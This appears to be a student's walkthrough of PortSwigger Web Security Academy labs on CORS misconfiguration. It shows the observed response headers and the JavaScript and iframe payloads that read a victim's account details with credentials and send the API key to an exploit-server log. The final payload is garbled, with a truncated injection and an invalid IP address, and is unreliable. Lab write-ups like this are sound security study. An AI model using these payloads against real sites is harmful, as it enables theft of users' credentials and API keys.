**Cross-origin resource sharing**


Submitted arbitrary header on Origin:
Response we get a 200 with a access-Control-Allow-Credentials header suggesting that it may support CORS. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/35caee02-7f84-4f97-aa4c-8d8c96bbf21b)





Will send us the victim api key

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
      location='/log?key='+this.responseText;
  };
</script>
```

**CORS vulnerability with trusted null origin**
Origin: null 
Gave us a CORS vuln
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3eba5d6e-0161-4be7-a350-52bfb5cebc66)


```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
Exploit:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
      location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

We got the user api in our access log

**CORS vulnerability with trusted insecure protocol***


Add a subdomain 
```
Origin: http://0af10055036af2e282c947d500680096.web-security-academy.net/product?productId=1
```




CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP. 

From <https://portswigger.net/web-security/cors/lab-breaking-https-attack> 

```
Access-Control-Allow-Origin: https://0af10055036af2e282c947d500680096.web-security-academy.net/product?productId=1
Access-Control-Allow-Origin: http://0af10055036af2e282c947d500680096.web-security-academy.net/product?productId=1
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bb51cc80-ab46-4b8b-a0c1-4a7dacca72fc)









Exploit: 
Exploit to retrieve API key

```
<script>
    document.location="http://stock.0ae10002044123ed8106ca53004f0040.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://172.18.1238.178/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

